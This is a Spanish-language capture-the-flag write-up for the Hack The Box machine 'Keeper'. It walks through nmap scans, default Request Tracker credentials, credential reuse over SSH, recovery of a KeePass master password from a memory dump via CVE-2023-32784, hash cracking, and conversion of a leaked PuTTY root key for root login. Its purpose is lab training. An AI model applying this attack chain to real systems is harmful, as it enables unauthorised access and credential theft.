# Keeper

![](../../../../~gitbook/image.md)Publicado: 14 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
###📝 Descripción
Keeper es una máquina Linux de dificultad fácil que presenta un servidor web con una aplicación de gestión de tickets (Request Tracker) vulnerable a credenciales por defecto. La máquina sigue un camino de explotación enfocado en la reutilización de credenciales y el análisis forense de memoria para obtener acceso a información sensible. Se aprovecha una vulnerabilidad de KeePass (CVE-2023-32784) para extraer una contraseña maestra de un volcado de memoria, lo que permite obtener acceso a credenciales privilegiadas almacenadas en una base de datos de KeePass. El desafío también requiere conocimientos sobre conversión de formatos de claves SSH para obtener acceso como usuario root.
###🚀 Metodología

###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos

####Enumeración de servicios

###🌐 Enumeración Web

####80 HTTP
![](../../../../~gitbook/image.md)⚠️ Importante: El servicio HTTP menciona que para crear un ticket visitemos el dominio tickets.keeper.htb. Debemos agregar este dominio a nuestro archivo hosts.Una vez añadido nos redirige correctamente:![](../../../../~gitbook/image.md)Una pequeña búsqueda en google sobre las credenciales por defecto del aplicativo Request tracker nos aporta la información necesaria para autenticarnos con éxito:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Enumerando la aplicación en la seccion Admin > Users > Select vemos que existen dos usuarios, el usuario actual con el que nos hemos autenticado "root" y otro llamado Inorgaard![](../../../../~gitbook/image.md)En el detalle del usuario vemos que en el campo comentarios hay una contraseña inicial con la que se estableció el usuario:![](../../../../~gitbook/image.md)Nos autenticamos en Request Tracker usando las credenciales de este usuario `lnorgaard:Welcome2023!`Al acceder vemos que tiene un ticket:![](../../../../~gitbook/image.md)
####Foothold
Probamos a utilizar estas credenciales tambien con el servicio SSH:Obtenemos la primera flag:
####👑 Escalada de privilegios
Enumeramos la máquina y vemos que en el mismo directorio de la flag hay un fichero comprimido. Tras descomprimirlo vemos que se trata del dump de keepass que mencionaba el usuario lnorgaard en el ticket en Request TrackerEl fichero passcodes.kdbx puede ser de gran utilidad.![](../../../../~gitbook/image.md)Para ello, lo transferimos a nuestro host de ataque usando scpA continuación usamos la herramienta keepass2john.py para extraer un hash que sea crackeable por la herramienta john the ripper:![](../../../../~gitbook/image.md)NOTA: Revisar si está bien copiado el hash porque a veces no se genera en una única línea y da problemas a la hora de que lo reconozca hashcat o john.Tras dejar a Hashcat trabajar durante bastante tiempo, no logra obtener la contraseña maestra.
###💻 Explotación

####🔓 CVE-2023-32784
Explorando otras opciones y buscando información sobre keepass, descubrimos que hay un CVE relacionado con una vulnerabilidad en KeepassLa vulnerabilidad permite extraer la clave maestra en texto plano de la memoria del proceso en ejecución. Esta clave permitirá a un atacante acceder a todas las credenciales almacenadas.Dado que en esta ocasión, también disponemos de un dump de keepass, procedemos a descargarlo y usarlo con la herramienta [keepass-password-dumper](https://github.com/vdohney/keepass-password-dumper)Necesitaremos una máquina windows donde ejecutar la aplicación:También podemos usar este script en python desde LInux:https://github.com/z-jxy/keepass_dumpHay dos caracteres que están ocultos y la palabra a priori no tiene mucho sentido. Si recordamos, el usuario tenía configurado el idioma en danés, hacemos una búsqueda en Google de esta palabra y vemos lo siguiente![](../../../../~gitbook/image.md)Parece ser un postre danés. Probamos a cargar el archivo en keepass introduciendo la contraseña obtenida como clave maestra:![](../../../../~gitbook/image.md)En el interior encontramos una clave ssh para el usuario root y una contraseña:![](../../../../~gitbook/image.md)Esto no es una clave id_rsa al uso, sino que está en un formato para que pueda ser operable por la herramienta Putty.
Para usar esta clave en Linux, primero hay que convertirla a un formato que openssh pueda entender `sudo apt install putty-tools`).Para ello, guardamos también el contenido en un fichero de texto asegurando de liminar cualquier espacio en blanco.A continuación transformamos la clave usando:De tal forma que ya tendremos nuestra clave en el formato que necesitamos:![](../../../../~gitbook/image.md)Ahora únicamente nos queda darle permisos 600 al fichero y conectarnos vía ssh y obtener la flag:Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🚀 Metodología](#metodologia)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💻 Explotación](#explotacion)

```
❯  ping -c2 10.10.11.227
PING 10.10.11.227 (10.10.11.227) 56(84) bytes of data.
64 bytes from 10.10.11.227: icmp_seq=1 ttl=63 time=46.9 ms
64 bytes from 10.10.11.227: icmp_seq=2 ttl=63 time=46.7 ms

--- 10.10.11.227 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1016ms
rtt min/avg/max/mdev = 46.713/46.797/46.881/0.084 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.227 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,80
```

```
nmap -sC -sV -p$ports 10.10.11.28 -oN services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 11:54 CEST
Nmap scan report for 10.10.11.28
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.76 seconds

```

```
echo "10.10.11.227 keeper.htb tickets.keeper.htb" | sudo tee -a /etc/hosts
```

```
ssh lnorgaard@10.10.11.227
lnorgaard@10.10.11.227's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$
```

```
lnorgaard@keeper:~$ cat user.txt
56f************************
lnorgaard@keeper:~$
```

```
lnorgaard@keeper:~$ unzip RT30000.zip
Archive:  RT30000.zip
inflating: KeePassDumpFull.dmp
extracting: passcodes.kdbx
lnorgaard@keeper:~$
```

```
scp lnorgaard@10.10.11.227:/home/lnorgaard/passcodes.kdbx .
```

```
keepass2john passcodes.kdbx  > passcodes.txt
```

```
hashcat -m 13400 passcodes.txt /usr/share/wordlists/rockyou.txt
```

```
scp lnorgaard@10.10.11.227:/home/lnorgaard/KeePassDumpFull.dmp .
```

```
PS>  git clone https://github.com/vdohney/keepass-password-dumper Cloning into 'keepass-password-dumper'... remote: Enumerating objects: 111, done. remote: Counting objects: 100% (111/111), done. remote: Compressing objects: 100% (79/79), done. remote: Total 111 (delta 61), reused 67 (delta 28), pack-reused 0 Receiving objects: 100% (111/111), 200.08 KiB | 3.45 MiB/s, done. Resolving deltas: 100% (61/61), done. PS C:\Users\0xdf > cd .\keepass-password-dumper\
```

```
PS C:\Users\keepass-password-dumper > dotnet run Z:\hackthebox\keeper-10.10.11.227\KeePassDumpFull.dmp ...[snip]... Password candidates (character positions): Unknown characters are displayed as "●" 1.: ● 2.: ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M, 3.: d, 4.: g, 5.: r, 6.: ø, 7.: d, 8.: , 9.: m, 10.: e, 11.: d, 12.: , 13.: f, 14.: l, 15.: ø, 16.: d, 17.: e, Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgørd med fløde
```

```
   ~/Documents/PentestTools/other/Keepass/keepass_dump   main ❯ python3 keepass_dump.py -f /home/kpanic/KeePassDumpFull.dmp
[*] Searching for masterkey characters
[-] Couldn't find jump points in file. Scanning with slower method.
[*] 0:	{UNKNOWN}
[*] 2:	d
[*] 3:	g
[*] 4:	r
[*] 6:	d
[*] 7:
[*] 8:	m
[*] 9:	e
[*] 10:	d
[*] 11:
[*] 12:	f
[*] 13:	l
[*] 15:	d
[*] 16:	e
[*] Extracted: {UNKNOWN}dgrd med flde
```

```
rødgrød med fløde
```

```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

```
puttygen private_key -O private-openssh -o pem_file.pem
```

```
chmod 600 pem_file.pem

ssh -i pem_file.pem root@10.10.11.227
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# whoami
root
root@keeper:~#
```
